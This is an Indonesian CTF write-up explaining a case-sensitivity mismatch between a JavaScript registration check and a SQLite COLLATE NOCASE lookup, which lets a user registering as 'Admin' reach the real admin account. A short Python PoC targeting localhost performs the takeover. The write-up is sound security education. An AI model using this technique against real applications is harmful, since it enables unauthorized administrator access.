---
title: Akun Admin Lagi
description: Akun Admin Lagi
tags:
  - access control
  - account takeover
  - CTF
draft: false
---

## Summary
* Vuln Name: Case Sensitivity Mismatch
* Type: Broken access control
* Impact: Account Takeover
* Severity: High
* functionality: [[registration]], [[login]], [[authorization]]

## Metodologi dan Observasi
1. Terdapat fungsi registrasi yang mengecek apakah username adalah `admin` secara case-sensitive (`username === 'admin'`).
2. Terdapat fungsi otorisasi pada route `/admin` yang mengambil data user dari database menggunakan query dengan `COLLATE NOCASE`.
3. Karena `admin` sudah ada di database, jika kita mendaftar dengan username `Admin` (huruf kapital), sistem akan mengizinkan registrasi.
4. Saat kita login sebagai `Admin` dan mengakses `/admin`, query `SELECT * FROM users WHERE username = ? COLLATE NOCASE` akan mencari user yang cocok tanpa memperhatikan kapitalisasi. 
5. Karena query menggunakan `db.get` (mengambil baris pertama yang cocok) dan `admin` dibuat lebih dulu, query tersebut akan mengembalikan baris milik `admin` asli.
6. Pengecekan `row.username === 'admin'` akan bernilai benar, dan kita berhasil mengelabui sistem.

## PoC
```python
import requests

url = 'http://localhost:1337'

s = requests.Session()

# 1. Register sebagai Admin (huruf kapital)
s.post(url + '/register', data={'username': 'Admin', 'password': 'password123'})

# 2. Login sebagai Admin
s.post(url + '/login', data={'username': 'Admin', 'password': 'password123'})

# 3. Akses halaman admin
res = s.get(url + '/admin')
print(res.text)
```

## Impact
Seseorang dapat melakukan [[account-takeover]] terhadap akun administrator dengan memanfaatkan perbedaan perlakuan *case sensitivity* antara fungsi di level aplikasi (JavaScript) dan level database (SQLite).
